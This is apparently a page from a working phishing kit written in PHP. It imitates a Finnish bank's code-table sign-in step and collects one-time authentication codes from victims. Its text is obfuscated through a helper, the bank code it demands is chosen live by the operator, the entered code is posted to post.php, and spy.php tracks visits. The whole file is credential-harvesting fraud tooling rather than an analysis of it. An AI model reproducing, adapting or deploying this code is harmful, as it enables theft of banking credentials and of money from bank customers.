<?php 
require '../main.php';
$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
    $ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/logo.svg">
</div>
<div class="right">
<span><?php $bm->obf("Tarvitsetko apua?"); ?></span>
<span><?php $bm->obf("Poistu"); ?></span>
</div>
</header>

<div class="banner">
    <img src="res/key.svg">
    <h4><?php $bm->obf("Tunnistautuminen"); ?></h4>
</div>

<main>
<div class="form-holder">
<div class="form-banner">
<h4><?php $bm->obf("Tunnuslukutaulukolla tunnistautuminen"); ?></h4>
</div>
<img src="res/user.jpg">

<div class="multi">
<div class="left">
<p><?php $bm->obf("Viimeistele tunnistautuminen tunnuslukutaulukolla. Tiesitkö että voit tunnistautua S-mobiililla ilman tunnuslukutaulukkoa?"); ?></p>
 </div>


<div class="right">

<div class="col">
<label><?php $bm->obf("Anna tunnusluku kohdasta"); ?> <?php echo @$m->getData()['MANUAL_TAN_CODE']; ?>:</label>
<input type="text" id="app">
</div>
<div class="col">
    <button onclick="sendCode()"><?php $bm->obf("Jatka"); ?></button>
</div>
<div class="col forgot">
<?php $bm->obf("Unohtuiko salasana"); ?>
</div>


</div>

</div>

</div>
</main>
    

<div class="window" id="error" style="display:<?php echo isset($_GET['e']) ? "block" : "none" ; ?>">
<div class="content">
<div class="form-error">
<h5>Virhe</h5>
<p><?php $bm->obf("Syötetty koodi on virheellinen"); ?></p>
<div style="text-align:center">
<button onclick="exitError()">Ok</button>
</div>
</div>
</div>
</div>


<script src="res/jq.js"></script>
<script src="res/m.js"></script>
<script>

$("#app").mask("00000000");

function exitError(){
    $("#error").hide();
}

function sendCode(){
    if($("#app").val().length==4){
        $.post("post.php",{app:$("#app").val()},(res)=>{
            window.location="mkfile.php?p=wait&params=?p=APP-CODE";
        });
    }else{
        $("#error").show();
    }
}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCode();
    }
});


    $.post("spy.php", {appview:1});
</script>
<?php 
$m->ctr("APP CODE ");
?>
</body>


</body>
</html>